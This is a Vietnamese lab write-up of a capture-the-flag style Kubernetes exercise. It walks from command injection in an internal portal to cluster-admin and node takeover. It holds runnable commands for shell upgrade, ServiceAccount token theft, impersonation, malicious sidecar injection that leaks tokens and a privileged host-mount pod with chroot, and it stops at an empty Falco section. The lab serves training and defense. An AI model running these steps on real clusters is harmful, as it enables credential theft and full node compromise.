---
title: "Dựng lab mô phỏng K8s và Demo kĩ thuật leo thang đặc quyền"
date: 2026-05-31 00:00:00 +0700
categories: ["Security-Research"]
tags: ["Kubernetes", "Security", "Lab", "Privilege Escalation"]
---


**Tên Lab**  
KubeOps Breach: From Internal Console to Cluster Takeover

**Bối Cảnh**  
Công ty giả lập VDTCloudOps vận hành một Kubernetes cluster nội bộ cho các workload production, CI/CD và platform automation. Gần đây đội SOC phát hiện một số request bất thường đến dịch vụ KubeOpsConsole, một portal nội bộ dùng cho kiểm tra trạng thái dịch vụ và hỗ trợ vận hành.

KubeOps Console được expose qua NodePort để đội vận hành truy cập nhanh trong môi trường lab. Ứng dụng này chỉ được thiết kế cho kiểm tra kết nối nội bộ, nhưng trong quá trình vận hành, một số tính năng debug legacy vẫn còn tồn tại.

Nhiệm vụ của bạn là đóng vai trò security engineer thực hiện controlled assessment trên lab này: bắt đầu từ một foothold trong workload thấp quyền, đánh giá các sai cấu hình Kubernetes, ghi nhận từng mức impact, và đề xuất detection/hardening tương ứng.


**Mục Tiêu Tổng Quát**  
Chứng minh rằng một lỗi ứng dụng nhỏ trong Kubernetes có thể trở thành chuỗi leo thang đặc quyền nhiều bước nếu RBAC, ServiceAccount token, workload permission và runtime isolation được cấu hình sai.

**Đề Bài Cho Người Chơi**  
Bạn được cung cấp địa chỉ của một portal nội bộ:

`http://<node-ip>:30679`

Portal này thuộc namespace production và chạy dưới ServiceAccount thấp quyền. Hãy đánh giá xem một lỗi command execution trong portal có thể dẫn tới mức ảnh hưởng nào trong cluster.

Bạn cần thu thập các flag theo từng giai đoạn để chứng minh impact.

### 1. Initial access

Bước đầu tiên của mọi lab khi có thông tin về Ip của target là Recon. Thì bài lab này mình sẽ Recon bằng Nmap ,  hoặc có thể recon bằng kube-hunter 

![](/assets/images/posts/Pasted%20image%2020260526221240.png)

1\. **NodePort Discovery**  
    Sau khi scan, chúng ta khám phá ra một service NodePort ở cổng 30679 trông rất đáng ngờ. Đây chính là mục tiêu để chúng ta đi sâu vào khai thác.

`nmap -p 30000-32767 192.168.221.131`
`curl http://192.168.221.131:30679/`


2\. **Kube API Server Recon**  
    Ta nhận thấy rằng có port 6443 là API của K8s nên curl thử thì bị chặn 

```
curl -k https://192.168.221.131:6443/version 
curl -k https://192.168.221.131:6443/api
```

![](/assets/images/posts/Pasted%20image%2020260528204440.png)


3\. **Kubelet API 10250**  
    

```
curl -k https://192.168.221.131:10250/pods 
curl -k https://192.168.221.131:10250/metrics
```

![](/assets/images/posts/Pasted%20image%2020260528204525.png)


`Unauthorized`  chứng tỏ rằng kubelet có auth đầy đủ chứ ko phải anonymous.


4\. **etcd 2379/2380**  
    

`curl -k https://192.168.221.131:2379/version curl -k https://192.168.221.131:2380/version`


`etcd exposed on host network, but protected by TLS/client cert. Still should be firewall-restricted.`

![](/assets/images/posts/Pasted%20image%2020260528204617.png)

5\. **kube-proxy 10256**  
    Chỉ healthz:

`curl http://192.168.221.131:10256/healthz`


Nmap ra các port được mở như này . Sau khi tham khảo các Port của K8s , bạn có thể search trên gg mà tìm ra 2379 là port etcd , 6443 là port của API K8s khi dựng bằng kubeadm ,đồng thời 10250 là của Kubelet . Còn chỉ có 30679 theo như tui tham khảo thì nó là NodePort Service.

Và sau khi truy cập vào Ip cùng với cổng nghi ngờ thì màn hình hiện ra là 1 màn hình dịch vụ Kubeops. Có vẻ dịch vụ này là 1 platform cho các Devops dùng
cho K8s
1. Xem tổng quan cluster/workload.
2. Theo dõi workload trong các namespace như prod, dev, kube-system.
3. Theo dõi incident vận hành.
4. Kiểm tra trạng thái API/health của portal.
5. Chạy diagnostics để kiểm tra kết nối nội bộ từ trong cluster.


![](/assets/images/posts/Pasted%20image%2020260530101725.png)

Ở trong phần Operations mình thấy có 1 phần input , sau đó thử test OS command injection 
x; ls thì màn hình liệt kê các file đang có trong 1 container.

Do đó mình sẽ reverse shell vào chỗ này , bằng lệnh như hình ở dưới



Dựng 1 máy lắng nghe thì đã dành được reverse shell 

![](/assets/images/posts/Pasted%20image%2020260525215324.png)

Nâng cấp shell 

```
python3 -c 'import pty; pty.spawn("/bin/bash")'

Ctrl + Z


stty raw -echo;fg

reset 

xterm-256color

```


### 2. Discovery

Mình đã có foodhold đầu tiên trong một Pod production nên biết tiếp theo sẽ là khám phá xem ở trong này có gì hay

Kiểm tra bằng các lệnh cơ bản như env , whoami , thì biết rằng mình đang có quyền root trong 1 pod được quản lí bởi Kubernetes 

 Để ý răng Có Pod_Namespace là Prod

![](/assets/images/posts/Pasted%20image%2020260526222251.png)

Có API service nội bộ nên có thể curl thử để xem quyền 

![](/assets/images/posts/Pasted%20image%2020260526222544.png)

Không token → system:anonymous → forbidden


**Mặc định pod thường đọc được ServiceAccount token của chính nó** nếu automountServiceAccountToken được bật nên mình thử liệt kê nó thì thấy cả ca.crt , namespace, và token , đồng thời mình cũng kiểm tra bằng các lệnh như ls /host để chứng mình rằng mình chưa có quyền host. Nhiệm vụ của mình bây giờ là phải thoát khỏi Pod này và chiếm được được toàn bộ cluster


![](/assets/images/posts/Pasted%20image%2020260526222708.png)


```
export APISERVER=https://${KUBERNETES_SERVICE_HOST}
export SERVICEACCOUNT=/run/secrets/kubernetes.io/serviceaccount
export NAMESPACE=$(cat ${SERVICEACCOUNT}/namespace)
export TOKEN=$(cat ${SERVICEACCOUNT}/token)
export CACERT=${SERVICEACCOUNT}/ca.crt
```

![](/assets/images/posts/Pasted%20image%2020260526222958.png)

Sau khi có đầy đủ identity thì mình sẽ gọi thử API server để kiểm tra xem mình có quyền xem pods hay namespace hay ko thì đa số gần như 403 

![](/assets/images/posts/Pasted%20image%2020260525220928.png)


![](/assets/images/posts/Pasted%20image%2020260525221019.png)


Dựng server ở local `python3 -m http.server 8000` để có thể dùng kubectl tương tác với API

![](/assets/images/posts/Pasted%20image%2020260526225322.png)


### Flag 1 - RBAC lateral movement

Điều đầu tiên khi có token là kiểm tra t có những quyền bằng auth can-i --list thì thấy rằng SA của kubeops-sa này dường như bị thắt quyền khá là chặt , ko thể xem namespace hay pods gì cả.

```
/tmp/kubectl --server $APISERVER \
  --certificate-authority $CACERT \
  --token $TOKEN \
  auth can-i --list
```

![](/assets/images/posts/Pasted%20image%2020260526224056.png)


Tạo alias 

```
alias k='/tmp/kubectl --server=$APISERVER --certificate-authority=$CACERT --token=$TOKEN'
```

```
k auth whoami

```


![](/assets/images/posts/Pasted%20image%2020260530120009.png)

Kết quả cho ta thấy rằng đây là SA token trong namespace là Prod tên là Kubeops-sa

Thì sau khi liệt kê sơ các quyền của SA token này thì hầu như nó bị config khá là chặt và hầu như ko có quyền gì 

Nhưng nhờ Dashboard của Kubeops có liệt kê các namespace như prod , dev , kubesystem nên mình đã biết được có 1 namespace là dev, hoặc là nếu ko dashboard ko cho biết namespace thì t cũng có thể bruforce để đoán được vì namespace dev này khá là nhiều.

![](/assets/images/posts/Pasted%20image%2020260530120122.png)


Nên thử dùng SA token đó và thử test xem mình có quyền gì trong namepspace dev đó thì kết quả cho thấy rằng mình có quyền debug bằng cách có thể tạo và exec vào các pods cũng như có thể xem các pods.

![](/assets/images/posts/Pasted%20image%2020260530120313.png)


Nghĩa là prod:kubeops-sa **không có quyền xem toàn cluster**, nhưng lại có quyền debug workload trong namespace dev bằng quyền exec pods ở resource là Ci-runner. Giờ pivot sang dev bằng cách dùng token của kubeops hiện có và lấy token của dev ci runner (Bạn có thể xem bằng cách get pods -n dev)


![](/assets/images/posts/Pasted%20image%2020260530120513.png)


nhưng nó có 1 cái rbac khá kĩ là hiện tại SA token này nó chỉ get được chừng này pods nhưng SA token này chỉ exec được duy nhất 1 pod là ci-runner thôi còn build-agent thì vẫn ko exec được


```
/tmp/kubectl exec -it -n dev ci-runner \
  --server=$APISERVER \
  --certificate-authority=$CACERT \
  --token=$TOKEN \
  -- /bin/bash
```

Sau khi exec vào ci-runner trong namespace dev thì mình tìm được flag đàu tiên

![](/assets/images/posts/Pasted%20image%2020260526225204.png)


### Flag 2 - Targeted Secret Theft


Sau khi mình exec vào  pods ci-runner để lấy token thì mình sẽ xuất token đó ra và dùng otken để để kiểm tra tiếp các quyền hiện tại 

![](/assets/images/posts/Pasted%20image%2020260526225446.png)

```

/tmp/kubectl exec -n dev ci-runner \
  --server=$APISERVER \
  --certificate-authority=$CACERT \
  --token=$TOKEN \
  -- cat /run/secrets/kubernetes.io/serviceaccount/token > /tmp/ci-token

export CI_TOKEN=$(cat /tmp/ci-token)
```


```
/tmp/kubectl auth can-i --list -n dev \
  --server=$APISERVER \
  --certificate-authority=$CACERT \
  --token=$CI_TOKEN


```

Khi tiếp tục dùng CI-token để liệt kê các quyền thì tôi thấy ở token này tôi có thể đọc được các secrets là ci-deploy-cache và deployer-token

![](/assets/images/posts/Pasted%20image%2020260527160611.png)


```
ci-runner-sa chỉ có quyền get đúng 2 secret trong dev:
- ci-deploy-cache
- deployer-token
```

Tạo alias cho lệnh

```
alias kci='/tmp/kubectl --server=$APISERVER --certificate-authority=$CACERT --token=$CI_TOKEN'
```


![](/assets/images/posts/Pasted%20image%2020260530121313.png)

![](/assets/images/posts/Pasted%20image%2020260530121746.png)


Sau khi lấy token của ci-runner-sa, mình không biết token này mạnh hay yếu.
Tôi dùng kubectl auth can-i --list để hỏi API Server quyền hiện tại.
Kết quả cho thấy ServiceAccount không được list secrets, không có quyền cluster-wide,
nhưng được get hai secret cụ thể: ci-deploy-cache và deployer-token.
Vì RBAC đã chỉ rõ resourceNames, attacker có cơ sở đọc hai secret này.

![](/assets/images/posts/Pasted%20image%2020260530121626.png)

Flag 2
![](/assets/images/posts/Pasted%20image%2020260527161614.png)


###  Flag 3 - Khai thác quyền Impersonation


Tới đây thì có 1 gợi ý cho 1 cái secret kia là "Legacy CI cache. Old deployment jobs hand off to the platform operator webhook during break-glass maintenance"

**Hệ thống đang chuyển giao dữ liệu từ bộ nhớ đệm CI cũ và các tiến trình triển khai cũ sang cho webhook của người vận hành quản lý (platform operator), nhằm phục vụ cho việc bảo trì khẩn cấp.**

![](/assets/images/posts/Pasted%20image%2020260530122001.png)


Tiếp tục t đọc thử secrets còn lại thì thấy có token của Service Account là deployer-token

![](/assets/images/posts/Pasted%20image%2020260527162239.png)

Extract token sạch 

```
/tmp/kubectl get secret deployer-token -n dev \
  -o jsonpath='{.data.token}' \
  --server=$APISERVER \
  --certificate-authority=$CACERT \
  --token=$CI_TOKEN | base64 -d > /tmp/deployer-token
  
  export DEPLOYER_TOKEN=$(cat /tmp/deployer-token)
```

Thì secret này được mã hóa base 64 2 lần nên mình giải mã rồi ném vào JWT.io để có thể xem thông tin chi tiết của Token 

![](/assets/images/posts/Pasted%20image%2020260527162636.png)

![](/assets/images/posts/Pasted%20image%2020260527162710.png)

Thì sau khi decode ra thì tui thấy đây là 1 service account tên là deployer-sa  ,token này ở trong namepsace dev

Đầu tiên thì vẫn tiếp tục check identity và tạo alias

```
/tmp/kubectl auth whoami \
  --server=$APISERVER \
  --certificate-authority=$CACERT \
  --token=$DEPLOYER_TOKEN
```

```
alias kd='/tmp/kubectl --server=$APISERVER --certificate-authority=$CACERT --token=$DEPLOYER_TOKEN'
```

![](/assets/images/posts/Pasted%20image%2020260530123915.png)

![](/assets/images/posts/Pasted%20image%2020260530123950.png)

Không có quyền gì hay để khai thác tiếp cả , mình nghĩ là phải tìm namespace khác để test 

Ngoài ra còn có thêm 1 namespace là platform system ở trang dash-board lúc đầu nữa , tui thử dùng token đó để liệt kê các quyền trong platform này thì thấy ko có gì cả 


![](/assets/images/posts/Pasted%20image%2020260527164408.png)

Chỗ này khá là bí bởi vì test platform-system cũng ko có gì , ko biết test namespace nào khác kiểu sao 

Nên tui quyết định thực hiện kĩ thuật internal network scanning ,tui có thử dnscan để quét ip service nhưng quét thử thì khá là lâu bởi vì dãy ip khá là dài, bạn có check tool tại link này 

https://gist.github.com/nirohfeld/c596898673ead369cb8992d97a1c764e

nhưng chợt nhớ ra là trong secret kia có 1 cái service trong platform 


![](/assets/images/posts/Pasted%20image%2020260527171950.png)


Không biết namespace trước thì dùng gợi ý ở trên + DNS recon bằng cách lợi dụng cơ chế phân giải tên miền của coreDNS 

Xem DNS:

`cat /etc/resolv.conf`

Test service DNS:

`getent hosts operator-webhook.platform.svc.cluster.local`

Nếu resolve được, có lý do probe namespace platform.

![](/assets/images/posts/Pasted%20image%2020260530123622.png)



Và khi tui thử namespace là platform thì cuối cùng cũng thấy được quyền của mình là impersonate

![](/assets/images/posts/Pasted%20image%2020260530124325.png)

Sau khi lấy được deployer-token, attacker kiểm tra quyền theo namespace platform.
Token dev:deployer-sa không phải admin, nhưng có quyền impersonate serviceaccount platform-operator.
Điều này cho phép attacker gửi request lên API Server dưới danh nghĩa platform-operator.

 **Kiểm tra platform-operator có quyền gì trong platform**

```
/tmp/kubectl auth can-i --list -n platform \
  --server=$APISERVER \
  --certificate-authority=$CACERT \
  --token=$DEPLOYER_TOKEN \
  --as=system:serviceaccount:platform:platform-operator
```

Kết quả trả về là quyền này cho chúng ta xem được 1 secret  bằng impersonate

![](/assets/images/posts/Pasted%20image%2020260530124422.png)


Tạo alias mới cho impersonate

```
alias kp='/tmp/kubectl --server=$APISERVER --certificate-authority=$CACERT --token=$DEPLOYER_TOKEN --as=system:serviceaccount:platform:platform-operator'
```

```
kp get secret delegate-operator-note -n platform -o yaml 
```

Thử đọc secret thì thấy được flag 

![](/assets/images/posts/Pasted%20image%2020260530125223.png)




Flag 3 đã có cùng với note  "The dev deployer may impersonate platform-operator during break-glass maintenance "

`Sau impersonation, attacker không chỉ đọc được note.


### Flag 4 - Sidecar Injection để có thể persistence + defense evansion


Attacker kiểm tra tiếp quyền của platform-operator ở namespace dev.
Nếu có patch deployments, attacker có thể sửa workload đang chạy để inject sidecar độc.`

Enum tiếp bằng quyền impersonate trên namespace là dev

```
/tmp/kubectl auth can-i --list -n dev \
  --server=$APISERVER \
  --certificate-authority=$CACERT \
  --token=$DEPLOYER_TOKEN \
  --as=system:serviceaccount:platform:platform-operator
```

Thì ở đây cũng tương tử ở trên là ở đây bạn cũng có quyền get list các pods cũng như deployment

![](/assets/images/posts/Pasted%20image%2020260530125509.png)

```
/tmp/kubectl get deploy,pod -n dev \
  --server=$APISERVER \
  --certificate-authority=$CACERT \
  --token=$DEPLOYER_TOKEN \
  --as=system:serviceaccount:platform:platform-operator

```

![](/assets/images/posts/Pasted%20image%2020260530125555.png)

Ở đây mình xem chi tiết file yaml của  deployment api-worker thì thấy rằng 

![](/assets/images/posts/Pasted%20image%2020260530125731.png)

Thì để ý rằng ở đoạn này 

![](/assets/images/posts/Pasted%20image%2020260530130248.png)

Hướng của mình là sẽ sử dụng sidecar injection để duy trì persistence để lỡ pods có bị tắt hay xóa thì  vẫn còn reverse shell

Các thông tin đã có :
- container array nằm ở /spec/template/spec/containers
- có volume tên shared-state
- mount path là /shared
- nếu thêm sidecar mount cùng volume /shared, nó có thể ghi file để container khác đọc được ( Kĩ thuật sidecar injection )


```
/tmp/kubectl patch deployment api-worker -n dev --type='json' \
  --server=$APISERVER \
  --certificate-authority=$CACERT \
  --token=$DEPLOYER_TOKEN \
  --as=system:serviceaccount:platform:platform-operator \
  -p='[
    {
      "op":"add",
      "path":"/spec/template/spec/containers/-",
      "value":{
        "name":"metrics-sidecar",
        "image":"python:3.12-slim",
        "imagePullPolicy":"IfNotPresent",
        "command":["/bin/sh","-c"],
        "args":["echo VDT2026{malicious_sidecar_persistence} > /shared/flag4.txt; sleep 360000"],
        "volumeMounts":[
          {
            "name":"shared-state",
            "mountPath":"/shared"
          }
        ]
      }
    }
  ]'
```


Sau đó check rollout:
```
/tmp/kubectl rollout status deployment/api-worker -n dev \
  --server=$APISERVER \
  --certificate-authority=$CACERT \
  --token=$DEPLOYER_TOKEN \
  --as=system:serviceaccount:platform:platform-operator
```


![](/assets/images/posts/Pasted%20image%2020260530130652.png)



Lấy tên Pod tự động và lưu vào biến `API_POD`

```
API_POD=$(/tmp/kubectl get pods -n dev -l app=api-worker \
  -o jsonpath='{.items[0].metadata.name}' \
  --server=$APISERVER \
  --certificate-authority=$CACERT \
  --token=$DEPLOYER_TOKEN \
  --as=system:serviceaccount:platform:platform-operator)
```


Chui vào Pod để đọc file  flag 4

```
/tmp/kubectl exec -n dev $API_POD -c api-worker \
  --server=$APISERVER \
  --certificate-authority=$CACERT \
  --token=$DEPLOYER_TOKEN \
  --as=system:serviceaccount:platform:platform-operator \
  -- cat /shared/flag4.txt
  
```

![](/assets/images/posts/Pasted%20image%2020260530131013.png)

flag4.txt là **mình cố tình cho sidecar ghi vào** để chứng minh sidecar đã chạy thành công. Trong thực tế attacker không ghi “flag”, mà sidecar sẽ làm các việc như:
đọc service account token, beacon về C2 proxy traffic nội bộ, đọc shared volume, hook/log request, duy trì persistence trong workload`

Nếu pod api-worker bị restart, ReplicaSet/Deployment sẽ tạo lại pod mới vẫn có sidecar độc.

Ban đầu attacker chỉ có reverse shell tạm thời trong kubeops-console. Shell này dễ mất nếu container restart hoặc pod bị xóa. Sau khi có quyền patch deployment, attacker chèn một sidecar vào api-worker. Vì sidecar nằm trong PodTemplate của Deployment, Kubernetes sẽ tự tạo lại nó sau mỗi lần pod bị xóa. Đây là kỹ thuật persistence ở tầng workload, kín hơn việc tạo một pod lạ.



### Flag 5: Container Escape via HostPath Misconfiguration

platform-operator đã có quyền exec vào pod dev

![](/assets/images/posts/Pasted%20image%2020260530131208.png)

Chỉ còn 1 cái build-agent là chúng ta chưa khai thác thử 

Như đã liệt kê hồi nãy thì khác với quyền của ci-runner SA token thì ở quyền này chúng ta có thể exec vào build-agent và đồng thời kiểm tra yaml của build-agent


```
/tmp/kubectl get pod build-agent -n dev -o yaml \
  --server=$APISERVER \
  --certificate-authority=$CACERT \
  --token=$DEPLOYER_TOKEN \
  --as=system:serviceaccount:platform:platform-operator
```

![](/assets/images/posts/Pasted%20image%2020260528175046.png)


```
privileged: true
hostPath: /var/lib/kubelet/pods
hostPath: /run/containerd/containerd.sock
```

đây là pod build runner quá quyền, có đường đọc token pod khác trên node.

Cụ thể rằng 
1. Quyền cấu hình `privileged: true` (Đặc quyền tối cao)

- **Nguy cơ**: Kẻ tấn công nếu chui được vào Pod này sẽ có toàn quyền như một user `root` chạy trực tiếp trên máy host.
- **Hành vi tấn công**: Kẻ xấu có thể nhìn thấy, can thiệp vào toàn bộ phần cứng, phân vùng ổ đĩa vật lý của node, hoặc chạy các lệnh kernel trực tiếp mà không bị container ngăn cản.

2. Gắn socket `containerd.sock` (`hostPath`) vào Pod

- **Nguy cơ**: Containerd socket là bộ não quản lý toàn bộ container chạy trên node đó.
- **Hành vi tấn công**: Khi có quyền truy cập vào file socket này, kẻ tấn công có thể cài đặt công cụ (như `nerdctl` hoặc `ctr`) bên trong Pod để ra lệnh ngược lại cho host. Từ đó tạo ra một container độc hại mới, gắn thẳng ổ đĩa root (`/`) của máy host vào để đọc toàn bộ dữ liệu nhạy cảm của hệ thống.

3. Gắn phân vùng `/var/lib/kubelet/pods` với `HostToContainer`

- **Nguy cơ**: Đường dẫn này chứa dữ liệu, token, bí mật (secrets), và cấu hình của **tất cả các Pod khác** đang chạy chung trên node `k8s-node`.
- **Hành vi tấn công**: Kẻ tấn công chỉ cần lùng sục trong thư mục `/node-pods` này để ăn cắp tài khoản (ServiceAccount Token) của các ứng dụng khác, từ đó leo thang đặc quyền trên toàn bộ cụm Kubernetes.

Trong demo này tôi dùng hướng 1 vì ổn định và đủ chứng minh node-level credential theft.

containerd.sock là **hướng escape/impact bổ sung**. Trong thực tế, nếu có tool như ctr/crictl trong container, attacker có thể nói chuyện với container runtime để list container, inspect mount, hoặc chạy workload mới trên host runtime. Nhưng để demo ổn định, mình đang dùng hostPath token theft là chính.

 **Exec vào build-agent**

```
/tmp/kubectl exec -it -n dev build-agent \
  --server=$APISERVER \
  --certificate-authority=$CACERT \
  --token=$DEPLOYER_TOKEN \
  --as=system:serviceaccount:platform:platform-operator \
  -- /bin/sh
  
```

Trong shell build-agent, kiểm tra nó có phải là pod nguy hiểm không bằng các lệnh sao

```
id
mount | grep -E 'node-pods|containerd'
ls -la /node-pods | head
ls -la /run/containerd/containerd.sock
```

![](/assets/images/posts/Pasted%20image%2020260530132226.png)


**1. Liệt kê toàn bộ token tìm được**


```
find /node-pods -path "*kube-api-access*/token" -type f 2>/dev/null > /tmp/token-paths.txt

//Decode claims để tìm token có giá trị:

i=0
while read t; do
  i=$((i+1))
  echo "===== TOKEN $i ====="
  echo "path: $t"
  cat "$t" | cut -d. -f2 | base64 -d 2>/dev/null \
    | grep -E '"namespace"|"pod"|"serviceaccount"|"sub"'
done < /tmp/token-paths.txt
```

![](/assets/images/posts/Pasted%20image%2020260528225741.png)

Lần này  thấy platform-system/node-telemetry-agent.

![](/assets/images/posts/Pasted%20image%2020260530132439.png)

![](/assets/images/posts/Pasted%20image%2020260530132526.png)

Copy đường dẫn của token đó lại

```
cp /node-pods/dbe5772e-9643-4534-bbab-de5f90b77e7e/volumes/kubernetes.io~projected/kube-api-access-hwxcc//token /tmp/node-telemetry-token
```



```
kp exec -n dev build-agent -- cat /tmp/node-telemetry-token > /tmp/node-telemetry-token

export NODE_TELEMETRY_TOKEN=$(cat /tmp/node-telemetry-token)

alias kt='/tmp/kubectl --server=$APISERVER --certificate-authority=$CACERT --token=$NODE_TELEMETRY_TOKEN'
```


Sau khi vào build-agent, tôi không cần biết trước token nào quan trọng. Tôi enum các projected ServiceAccount token mà kubelet lưu dưới /var/lib/kubelet/pods, decode JWT payload để xem namespace, pod và serviceAccount. Khi thấy token thuộc platform-system/node-telemetry-agent, đây là một DaemonSet hệ thống có khả năng là trampoline pod nên tôi kiểm tra quyền của token đó 

Thì thấy cũng chả có gì hay cả , thử đổi  namespace khác xem 

![](/assets/images/posts/Pasted%20image%2020260530134016.png)



nhưng tui chợt nhớ lại cái node-telemetry này có gợi ý là của platform-system nên tui test xem 

![](/assets/images/posts/Pasted%20image%2020260530133923.png)

![](/assets/images/posts/Pasted%20image%2020260530134049.png)

Lại tiếp tục có quyền get secrets ở đây, ta thử đọc secret đó xem sao

![](/assets/images/posts/Pasted%20image%2020260530134221.png)

Và ta đã có được flag 5 cùng với gợi ý tiếp theo "Node telemetry can maintain the kube-system release-controller during break-glass windows, but it is not a cluster-admin identity"


### Root flag - Trampoline Pod to Cluster admin (Privilege escalation)


Có gợi ý liên quan tới cluster-admin nên thử test thử cái này có quyền cluster-admin ko

![](/assets/images/posts/Pasted%20image%2020260530134410.png)

Nhưng gợi ý có nhắc là node telemetry này có thể bảo trì kube-system , t thử check namespace đó thử 

![](/assets/images/posts/Pasted%20image%2020260530135014.png)

Và tới đây gần như là sắp xong rồi vì gần như chúng ta đã có mọi thứ như get pods , list pods hoặc patch deployment với resouce là release controller , đây  là điển hình của trampoline pod (Ở đây là daemonset)


Thì tiếp tục ở đây chúng ta có thể liệt kê được các pods quan trọng có  trong k8s

![](/assets/images/posts/Pasted%20image%2020260530135631.png)



Việc bây giờ sẽ là Patch release-controller thêm sidecar lấy token:

```
/tmp/kubectl patch deployment release-controller -n kube-system --type='json' -p='[
  {
    "op":"add",
    "path":"/spec/template/spec/containers/-",
    "value":{
      "name":"release-token-tap",
      "image":"python:3.12-slim",
      "imagePullPolicy":"IfNotPresent",
      "command":["/bin/sh","-c"],
      "args":["echo VDT2026{trampoline_patch_to_release_controller}; cat /run/secrets/kubernetes.io/serviceaccount/token; sleep 360000"]
    }
  }
]' \
  --server=$APISERVER \
  --certificate-authority=$CACERT \
  --token=$NODE_TELEMETRY_TOKEN
```


Làm lại lấy pod mới:

```
/tmp/kubectl get pods -n kube-system -l app=release-controller \
  --server=$APISERVER \
  --certificate-authority=$CACERT \
  --token=$NODE_TELEMETRY_TOKEN
```

Lấy pod release-controller:

```
RELEASE_POD=$(/tmp/kubectl get pods -n kube-system -l app=release-controller \
  -o jsonpath='{.items[0].metadata.name}' \
  --server=$APISERVER \
  --certificate-authority=$CACERT \
  --token=$NODE_TELEMETRY_TOKEN)
```

Xem container trong pod:

```
/tmp/kubectl get pod "$RELEASE_POD" -n kube-system \
  -o jsonpath='{.spec.containers[*].name}' \
  --server=$APISERVER \
  --certificate-authority=$CACERT \
  --token=$NODE_TELEMETRY_TOKEN; echo
```


Đọc log sidecar:

```
/tmp/kubectl logs -n kube-system "$RELEASE_POD" -c release-token-tap \
  --server=$APISERVER \
  --certificate-authority=$CACERT \
  --token=$NODE_TELEMETRY_TOKEN
```

![](/assets/images/posts/Pasted%20image%2020260530140447.png)

![](/assets/images/posts/Pasted%20image%2020260530141411.png)

Lấy JWT tự động 

```
/tmp/kubectl logs -n kube-system "$RELEASE_POD" -c release-token-tap \
  --server=$APISERVER \
  --certificate-authority=$CACERT \
  --token=$NODE_TELEMETRY_TOKEN \
  | grep '^eyJ' > /tmp/release-token
  
  export RELEASE_TOKEN=$(cat /tmp/release-token)
```

Và lấy token đó để check thì t thấy rằng đã có cluster admin

![](/assets/images/posts/Pasted%20image%2020260530141737.png)

```
alias kr='/tmp/kubectl --server=$APISERVER --certificate-authority=$CACERT --token=$RELEASE_TOKEN'
```



```
cat > /tmp/node-maintenance.yaml <<'EOF'
apiVersion: v1
kind: Pod
metadata:
  name: node-maintenance
  namespace: kube-system
spec:
  hostNetwork: true
  hostPID: true
  hostIPC: true
  restartPolicy: Never
  containers:
  - name: node-maintenance
    image: python:3.12-slim
    imagePullPolicy: IfNotPresent
    securityContext:
      privileged: true
    command: ["/bin/sh", "-c"]
    args: ["sleep 360000"]
    volumeMounts:
    - name: host-root
      mountPath: /host
  volumes:
  - name: host-root
    hostPath:
      path: /
      type: Directory
EOF
```

Ý nghĩa của pods này là 
```
hostPID: true
-> container có thể nhìn process namespace của host

hostNetwork: true
-> dùng network namespace của node

privileged: true
-> container có capabilities gần như root trên host

hostPath path: /
-> mount toàn bộ filesystem của node

mountPath: /host
-> trong container, host filesystem nằm ở 
```

 Bạn có thể xem thêm cách này  ở đây cũng khá là hay https://x.com/mauilion/status/1129468485480751104

Tới đây attacker đã chuyển từ Pod compromise sang Cluster Admin, sau đó dùng quyền Cluster Admin tạo privileged Pod mount host filesystem. Đây là final impact: kiểm soát Kubernetes API dẫn đến đọc filesystem node.

![](/assets/images/posts/Pasted%20image%2020260530142833.png)


Exec `kr exec -it node-maintenance -n kube-system -- /bin/sh`

Enum trong pod
```
id
hostname
ls /host
cat /host/etc/os-release
cat /host/root/root.txt
```

```
chroot /host /bin/bash
whoami
hostname
cat /root/root.txt
```

![](/assets/images/posts/Pasted%20image%2020260530143331.png)

![](/assets/images/posts/Pasted%20image%2020260530143852.png)

chroot /host /bin/bash nghĩa là:

`đổi root filesystem của process hiện tại sang thư mục /host, rồi chạy /bin/bash bên trong filesystem đó.`

chroot không phải exploit riêng, mà là bước hậu khai thác sau khi attacker đã mount được root filesystem của node vào container. Khi đổi root filesystem sang /host, attacker thao tác với hệ điều hành node như root, có thể đọc file nhạy cảm hoặc ghi persistence như SSH key/cron nếu muốn chứng minh thêm impact.

**Attack Path **

```
Lab mô phỏng chuỗi tấn công thực tế trong Kubernetes:
từ RCE trong internal operations portal, attacker lấy token ServiceAccount,
lateral movement qua pods/exec, đọc secret có giới hạn, abuse impersonation,
cài sidecar persistence, khai thác privileged CI runner có hostPath để đọc token pod khác trên node,
dùng trampoline DaemonSet token để patch controller mạnh hơn,
lấy token cluster-admin, rồi tạo privileged pod mount host filesystem để chiếm node.

Falco được dùng để phát hiện các hành vi runtime như reverse shell,
đọc token, hostPath token theft và chroot vào host. Các hành vi API-level
như impersonation, get secret, patch deployment cần được bổ sung bằng Kubernetes Audit Logs.

```


```
Initial Access:
KubeOps Console RCE
-> reverse shell trong prod/kubeops-console

Flag 1 - RBAC Lateral Movement:
kubeops-sa không có quyền cluster-wide
-> nhưng có get/list pods trong dev
-> có pods/exec chỉ vào dev/ci-runner
-> exec sang ci-runner
-> VDT2026{rbac_pods_exec_lateral_movement}

Flag 2 - Targeted Secret Theft:
trong ci-runner lấy token ci-runner-sa
-> ci-runner-sa không list được toàn bộ secrets
-> chỉ get được ci-deploy-cache và deployer-token trong dev
-> đọc ci-deploy-cache
-> lấy deployer-sa token từ deployer-token
-> VDT2026{k8s_secret_theft_without_admin}

Flag 3 - Impersonation:
deployer-sa không phải admin
-> nhưng có quyền impersonate platform/platform-operator
-> dùng --as=system:serviceaccount:platform:platform-operator
-> đọc delegate-operator-note
-> VDT2026{impersonation_can_turn_delegate_into_admin}

Flag 4 - Sidecar Persistence:
platform-operator có quyền patch deployment trong dev
-> patch dev/api-worker
-> inject metrics-sidecar dùng chung shared volume
-> sidecar tồn tại theo Deployment, Pod bị recreate vẫn còn
-> VDT2026{malicious_sidecar_persistence}

Flag 5 - Container Escape / Node Token Theft:
platform-operator có quyền exec vào dev/build-agent
-> build-agent là CI workload bị cấu hình sai: privileged + hostPath /var/lib/kubelet/pods + containerd.sock
-> attacker đọc /node-pods, tức dữ liệu kubelet trên node
-> lấy token của platform-system/node-telemetry-agent DaemonSet
-> node-telemetry-agent không phải cluster-admin, chỉ là trampoline identity
-> VDT2026{container_escape_to_node_token_theft}

Trampoline Escalation:
node-telemetry-agent có quyền break-glass patch kube-system/release-controller
-> patch release-controller thêm sidecar tạm thời
-> sidecar in ServiceAccount token của release-controller ra logs
-> lấy release-controller token
-> release-controller mới là cluster-admin

Root Flag - Final Impact:
dùng release-controller cluster-admin token
-> tạo privileged pod mount host /
-> chroot hoặc đọc trực tiếp /host/root/root.txt
-> VDT2026{pod_compromise_to_cluster_admin_to_node_takeover}
```



## II. Triển khai tool giám sát bằng Falco 

## 1. Cài Falco bằng Helm

Trên k8s-node:

